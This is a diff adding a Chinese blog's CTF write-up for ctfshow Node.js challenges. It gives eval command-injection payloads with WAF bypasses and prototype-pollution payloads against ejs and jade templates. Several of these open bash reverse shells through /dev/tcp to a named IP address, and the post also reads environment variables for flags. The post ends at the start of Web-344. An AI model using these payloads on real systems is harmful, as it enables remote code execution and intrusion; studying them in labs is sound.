@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-trophy-1.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"show_result":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="nodejs刷题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow-nodejs">
+<meta property="og:url" content="http://example.com/post/372ab69b.html">
+<meta property="og:site_name" content="Z1d10tのBlog">
+<meta property="og:description" content="nodejs刷题">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683554090247-ff1c2fc3-f003-4545-bf76-66639c40658b.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683554186939-e3aed060-1725-4070-ac8c-9b1b5c3e42fa.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683555038903-2775ef86-cbc4-40d8-be79-40e3b7d08b79.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683557652246-a808a88e-6dd5-4b14-84f1-a84d4af958d8.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683559440720-45034e2c-417e-47c8-a101-9e188bd902f2.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683559770866-5f796f05-3f52-4681-9481-efbeeb866d8d.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683558958836-ddb03c4f-d761-4df2-8cc7-f9abcf68303e.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683598380991-64209db3-a460-4b75-afe7-df8776ea2216.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683637579498-c75155d1-168c-4366-9602-d3ef54456d8a.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683637631439-cf02616e-fcbb-443e-9873-bee89aeaab0d.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683638759001-e1aa0968-7e8c-4aaf-958b-81ea9f963718.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683644860927-cc3a4cc9-9c22-403c-bc3c-c1af74831522.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684596147-6e4fef35-4a8e-416b-a460-35b266724fe8.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684527595-86a87036-1fd4-40cb-8708-94c204bd0d1c.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684961708-f7e1d476-7428-4704-a807-1a67cacfe7ba.png">
+<meta property="article:published_time" content="2023-05-10T02:46:41.000Z">
+<meta property="article:modified_time" content="2023-05-10T02:48:13.120Z">
+<meta property="article:author" content="Z1d10t">
+<meta property="article:tag" content="nodejs原型链污染">
+<meta property="article:tag" content="nodejs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683554090247-ff1c2fc3-f003-4545-bf76-66639c40658b.png">
+
+
+<link rel="canonical" href="http://example.com/post/372ab69b.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/post/372ab69b.html","path":"post/372ab69b.html","title":"ctfshow-nodejs"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ctfshow-nodejs | Z1d10tのBlog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Z1d10tのBlog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"> </p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-house fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tag fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-rectangle-list fa-fw"></i>分类</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于博主</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-334"><span class="nav-number">2.</span> <span class="nav-text">Web-334</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-335"><span class="nav-number">3.</span> <span class="nav-text">Web-335</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-336"><span class="nav-number">4.</span> <span class="nav-text">Web-336</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="nav-number">4.1.</span> <span class="nav-text">解法一：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="nav-number">4.2.</span> <span class="nav-text">解法二：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%89%EF%BC%9A"><span class="nav-number">4.3.</span> <span class="nav-text">解法三：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-337"><span class="nav-number">5.</span> <span class="nav-text">Web-337</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-338"><span class="nav-number">6.</span> <span class="nav-text">Web-338</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-339"><span class="nav-number">7.</span> <span class="nav-text">Web-339</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-340"><span class="nav-number">8.</span> <span class="nav-text">Web-340</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-341"><span class="nav-number">9.</span> <span class="nav-text">Web-341</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-342%E3%80%81343"><span class="nav-number">10.</span> <span class="nav-text">Web-342、343</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-344-nodejs-%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7"><span class="nav-number">11.</span> <span class="nav-text">Web-344(nodejs 解析特性)</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z1d10t"
+      src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png">
+  <p class="site-author-name" itemprop="name">Z1d10t</p>
+  <div class="site-description" itemprop="description">welcome to my blog (*^_^*)</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">48</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">80</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/post/372ab69b.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png">
+      <meta itemprop="name" content="Z1d10t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z1d10tのBlog">
+      <meta itemprop="description" content="welcome to my blog (*^_^*)">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ctfshow-nodejs | Z1d10tのBlog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow-nodejs
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-05-10 10:46:41 / 修改时间：10:48:13" itemprop="dateCreated datePublished" datetime="2023-05-10T10:46:41+08:00">2023-05-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>nodejs刷题</p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为打一次比赛做到了这个nodejs原型链污染，是一点头绪都没有，就来恶补一下，keep on！</p>
+<h1 id="Web-334"><a href="#Web-334" class="headerlink" title="Web-334"></a>Web-334</h1><p>代码审计 </p>
+<p>给了账号和密码 账号是大写的<code>CTFSHOW</code>，但是输入的账号不能为大写，有个小写转大写的操作，输入<code>ctfshow</code>即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">return</span> users.<span class="title function_ invoke__">find</span>(function(item)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.username === name.<span class="title function_ invoke__">toUpperCase</span>() &amp;&amp; item.password === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Web-335"><a href="#Web-335" class="headerlink" title="Web-335"></a>Web-335</h1><p>eval()用法和php差不多 都是将字符串当作代码执行</p>
+<p>这里nodejs执行命令类似于python 要调库 比如 python就要调包含目录执行的库，比如os，在nodejs里也是一样 不过这里都是通过<code>require(&#39;模块&#39;)</code>来调(不严谨 但是可以这么理解)</p>
+<p>payload:<code>/?eval=require(&#39;child_process&#39;).execSync(&#39;ls&#39;)</code></p>
+<p>可以参考nodejs中文网<a target="_blank" rel="noopener" href="https://nodejs.cn/api/child_process.html#child-process">https://nodejs.cn/api/child_process.html#child-process</a></p>
+<p>但是其他命令执行函数比如<code>exec()</code>返回都是<code>[object Object]</code></p>
+<p>在这里只能用<code>execSync</code></p>
+<h1 id="Web-336"><a href="#Web-336" class="headerlink" title="Web-336"></a>Web-336</h1><h2 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h2><p>设置了waf</p>
+<p>读当前文件路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=__filename</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683554090247-ff1c2fc3-f003-4545-bf76-66639c40658b.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;/app/routes/index.js&#x27;, &#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>这里fs模块负责读写文件</p>
+<p>读当前文件</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683554186939-e3aed060-1725-4070-ac8c-9b1b5c3e42fa.png" alt="img"></p>
+<p>过滤了<code>exec load</code></p>
+<p>通过字符拼接绕过：<code>?eval=require(&#39;child_process&#39;)[&#39;exe&#39;%2B&#39;cSync&#39;](&#39;ls&#39;)</code></p>
+<p><code>%2B</code>是<code>+</code>的url编码</p>
+<h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p>用fs模块读当前路径文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683555038903-2775ef86-cbc4-40d8-be79-40e3b7d08b79.png" alt="img"></p>
+<p>直接读就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;fl001g.txt&#x27;,&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>这里读路径和文件命令稍有不同 不过很好记</p>
+<h2 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=require(&quot;child_process&quot;)[&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;](&#x27;cmd&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>利用编码绕过</p>
+<h1 id="Web-337"><a href="#Web-337" class="headerlink" title="Web-337"></a>Web-337</h1><p>给了源码 类似于php的md5思路</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1&amp;b[]=1</span><br></pre></td></tr></table></figure>
+
+<p>可以看师傅的总结 tql：<a target="_blank" rel="noopener" href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/</a></p>
+<p>Web-336的编码绕过就是看了这个师傅的</p>
+<h1 id="Web-338"><a href="#Web-338" class="headerlink" title="Web-338"></a>Web-338</h1><p>给了源码</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683557652246-a808a88e-6dd5-4b14-84f1-a84d4af958d8.png" alt="img"></p>
+<p>当secert对象的ctfshow属性为题目所需值就给flag</p>
+<p>那么就通过原型链污染Object的ctfshow属性 从而使得secert对象为所需值</p>
+<p>可利用点为这个copy函数 </p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683559440720-45034e2c-417e-47c8-a101-9e188bd902f2.png" alt="img"></p>
+<p>跟踪一下</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683559770866-5f796f05-3f52-4681-9481-efbeeb866d8d.png" alt="img"></p>
+<p>发现了原型链污染的经典语句</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683558958836-ddb03c4f-d761-4df2-8cc7-f9abcf68303e.png" alt="img"></p>
+<p>当时做这道题题目时候有个疑问就是为什么post传输的数据是在哪里接受到的，因为是零基础js，还在慢慢摸索，又去审了一次代码</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683598380991-64209db3-a460-4b75-afe7-df8776ea2216.png" alt="img"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_ invoke__">json</span>(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>整个语句都是<code>router&#123;&#125;</code>囊括起来的,并且是通过post传参，而且还加载了<code>require(&#39;body-parser&#39;)</code>中间键。</p>
+<p>body-parser是非常常用的一个express中间件，作用是对post请求的请求体进行解析  。</p>
+<p>除此之外为什么要用json格式传输，p神博客中也提及了，如果不用json文件发送那么<code>__proto__</code>就会被当作原型执行，导致污染失败，只有通过json格式提交，才会被当作key来执行，这样才能达到原型链污染的效果。</p>
+<p>关于nodejs请求 可以参考这篇文章比较符合我这种新手：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Diamond-sjh/p/11324138.html">https://www.cnblogs.com/Diamond-sjh/p/11324138.html</a></p>
+<h1 id="Web-339"><a href="#Web-339" class="headerlink" title="Web-339"></a>Web-339</h1><p>这道题目多了一个/api路由 并且看到了render 多了一个模板渲染</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683637579498-c75155d1-168c-4366-9602-d3ef54456d8a.png" alt="img"></p>
+<p>发现Function 这里借用p神的理解</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683637631439-cf02616e-fcbb-443e-9873-bee89aeaab0d.png" alt="img"></p>
+<p>这里query没有被定义，就会在Object对象中寻找这个属性，那么我们就向上污染Object添加一个query属性就行了 。</p>
+<p>这里提供三种payload:</p>
+<p>payload1:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>outputFunctionName</code>是ejs引擎的一个属性 可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/DARKNOTES/article/details/124000520">https://blog.csdn.net/DARKNOTES/article/details/124000520</a></p>
+<p>payload2:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没有require，所以就用 <code>global.process.mainModule.constructor._load</code>来导入 child_process</p>
+<p>payload3:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;var net = process.mainModule.constructor._load(&#x27;net&#x27;),cp = process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(port,&#x27;ip&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p> Function环境下没有require函数，不能获得child_process模块，我们可以通过使用<code>process.mainModule.constructor._load</code>来代替require。  </p>
+<p>然后flag藏在环境变量里 一开始被这个坑到了</p>
+<h1 id="Web-340"><a href="#Web-340" class="headerlink" title="Web-340"></a>Web-340</h1><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683638759001-e1aa0968-7e8c-4aaf-958b-81ea9f963718.png" alt="img"></p>
+<p>这里user为一个对象 他的属性userinfo也是一个对象 </p>
+<p>那么如果我们想通过copy函数通过<code>user.userinfo</code>污染到<code>Object.prototype</code></p>
+<p>即则<code>user.userinfo-&gt;user(第一次污染)-&gt;Object(第二次污染)</code>需要污染两次</p>
+<p>路由/api的思路和上一题一样 则可以用上题的payload，嵌套一个__proto__即可</p>
+<p> <code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/124.221.177.174/7777 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></p>
+<h1 id="Web-341"><a href="#Web-341" class="headerlink" title="Web-341"></a>Web-341</h1><p>没了/api路由</p>
+<p>也没有了条件输出flag</p>
+<p>看了wp是ejs的模板引擎的原型链污染rce</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683644860927-cc3a4cc9-9c22-403c-bc3c-c1af74831522.png" alt="img"></p>
+<p>那么既然没有条件Function函数让我们执行命令，也没有输出flag，该怎么弄呢</p>
+<p>整体分析可参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236354#h2-2">https://www.anquanke.com/post/id/236354#h2-2</a></p>
+<p>大致思路为：通过原型链污染 去覆盖这个模板渲染时的拼接代码，让其拼接进ejs模板代码种，从而渲染时进行RCE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/124.221.177.174/7777 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Web-342、343"><a href="#Web-342、343" class="headerlink" title="Web-342、343"></a>Web-342、343</h1><p>审计源码，发现换了模板引擎</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684596147-6e4fef35-4a8e-416b-a460-35b266724fe8.png" alt="img"></p>
+<p>思路与上面ejs模板相同 直接看师傅们的payload即可</p>
+<ol>
+<li><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/124.221.177.###/7777 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></li>
+<li><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/124.221.###.174/7777 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></li>
+<li><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot; bash -i &gt;&amp;/dev/tcp/124.221.177.###/7777 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></li>
+</ol>
+<p>注意这里有两个大坑 坑死我了</p>
+<p>首先提交要post burp默认get</p>
+<p>最坑的是Content-Type要改为 <code>application/json</code>玛德当时这里一直是默认的 一直没改 导致一直反弹失败</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684527595-86a87036-1fd4-40cb-8708-94c204bd0d1c.png" alt="img"></p>
+<p>然后再来说说找flag的方法 </p>
+<p>直接<code>cat /proc/self/environ</code>去找</p>
+<p>或者<code>env|grep ctfshow</code> 其实就是管道符把env的输出的内容当作grep(查找字符)的参数</p>
+<p>其实本质上这两者是等价的 都是在环境变量种寻找flag</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684961708-f7e1d476-7428-4704-a807-1a67cacfe7ba.png" alt="img"></p>
+<h1 id="Web-344-nodejs-解析特性"><a href="#Web-344-nodejs-解析特性" class="headerlink" title="Web-344(nodejs 解析特性)"></a>Web-344(nodejs 解析特性)</h1><p>给了源码：</p>
